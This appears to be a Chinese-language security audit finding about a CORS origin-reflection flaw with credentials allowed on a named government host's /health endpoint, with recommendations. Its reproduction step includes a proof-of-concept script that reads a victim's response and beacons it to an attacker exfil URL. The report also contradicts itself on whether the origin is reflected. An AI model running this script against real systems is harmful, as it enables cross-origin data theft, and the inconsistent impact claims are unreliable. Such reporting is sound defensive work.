# 4004 /health 端点 CORS 任意 Origin 反射 + ACAC + URL 参数 JWT（钓鱼链 PoC 完整可行）

- ID: `b65c0339-1285-4594-a102-1a1400bc4c65`
- Severity: **high**
- Status: open
- Type: CORS配置错误 / 跨域访问控制绕过
- Target: `https://epcr.tpf.gov.tw:4004/health`
- Conversation: `099b7fa7-8da3-473a-876d-6f1c5a2bcd71`
- Created: 2026-08-30 16:18:01.729754225+08:00

## Description

Express/Node.js 认证服务器在 /health?token= 端点上配置了危险的 CORS 策略：CORS 中间件对任意非空非 null Origin 无差别反射 Access-Control-Allow-Origin（保留原始 Origin 大小写/协议/端口），同时下发 Access-Control-Allow-Credentials: true。结合 JWT 通过 URL 参数（?token=）而非标准 Authorization 头传递，构成可独立利用的跨域钓鱼链：攻击者部署任意域名页面（如 https://evil.epcr.tpf.gov.tw.attacker.com 或 https://attacker.epcr.tpf.gov.tw），通过 fetch() 跨域读取 /health?token= 响应内容——无需控制真实 EPCR 域。已实测 8 个 Origin 变体（合法主域、前缀混淆、后缀混淆、虚构子域、大小写不敏感、长前缀混淆、协议降级）全部通过 CORS 反射。仅"无 Origin 头"与"Origin: null"两种特殊情况不反射。

## Preconditions

1. 受害者访问攻击者控制的恶意页面（含 CORS 反射 PoC JS）。
2. 受害者持有 epcr.tpf.gov.tw:4004 颁发的合法 JWT（无论通过何种途径——登录/XSS/会话窃取）。
3. 浏览器启用 CORS（现代浏览器默认行为）。
无需任何服务端凭证/账号。

## Reproduction

1. 攻击者部署任意域名钓鱼页面（无需控制 epcr.tpf.gov.tw 域）。示例：https://attacker.com/evil.html
2. evil.html 内容：
   ```html
   <script>
   fetch('https://epcr.tpf.gov.tw:4004/health?token=<受害者JWT>', {
     credentials: 'include'
   })
   .then(r => r.text())
   .then(body => {
     // 浏览器 CORS 检查通过，可读取响应内容
     navigator.sendBeacon('https://attacker.com/exfil', body);
   });
   </script>
   ```
3. 受害者浏览器加载 evil.html，浏览器自动发起跨域 GET 请求。
4. 服务端对请求 Origin（https://attacker.com）原样反射 ACAO + ACAC: true。
5. 浏览器 CORS 检查通过，JS 读取到响应内容（健康状态/敏感业务数据），外泄到攻击者。
6. 验证方法：服务端 curl 测试
   ```
   curl -i 'https://epcr.tpf.gov.tw:4004/health?token=bad' \
     -H 'Origin: https://evil.example.com'
   ```
   确认响应包含 `access-control-allow-origin: https://evil.example.com` + `access-control-allow-credentials: true`。

## Impact

1. **跨域钓鱼链**：攻击者页面可读取合法 JWT 用户的 /health 响应（含敏感业务状态）——若 JWT 通过 URL 泄露（Referer/日志/浏览器历史），则完整跨域可读。
2. **JWT 错误码探测**：攻击者可跨域探测服务端 JWT 错误响应差异（jwt malformed vs invalid signature），为 JWT 密钥爆破提供 oracle。
3. **配置反模式**：vary: Origin + ACAC: true 始终下发但 ACAO 不反射——一旦后续代码 patch 改为允许 *.epcr.tpf.gov.tw 白名单反射 ACAO，立即成为完整跨域可读漏洞（升级到 Critical）。
4. **路由级不一致**：/health 反射 ACAO 而 /captcha 不反射，提示 CORS 策略按路径配置且分散管理，存在大量未审计路由。
5. **JWT 通道问题**：URL 参数 token= 是已知不安全模式（Referer/日志泄露），与 CORS 反射叠加放大风险。

## Recommendation

1. **CORS 收敛**：将 4004 全部端点的 CORS 反射收敛到明确白名单（如 `https://epcr.tpf.gov.tw` 单域名），禁止任意 Origin 反射。删除 `Access-Control-Allow-Origin: *` 与回显请求 Origin 的逻辑。
2. **ACAC 收敛**：仅在明确需要的端点（如 OAuth/SAML）保留 `Access-Control-Allow-Credentials: true`，其余端点删除。
3. **JWT 通道迁移**：废弃 `?token=` URL 参数通道，统一改为标准 `Authorization: Bearer <token>` 头。
4. **CORS 集中管理**：在 Express app.js 顶层统一配置 cors({origin: whitelist, credentials: true})，禁止路由级覆盖。
5. **Cookie 强化**：connect.sid 添加 `Secure` 标志，强制 HTTPS-only。
6. **监控与告警**：服务端记录所有 ACAO 反射日志，触发异常 Origin 告警。
7. **CORS 误配扫描**：定期跑 CORS 扫描工具（CORScanner、corsy）覆盖全部路由，包括动态路由。
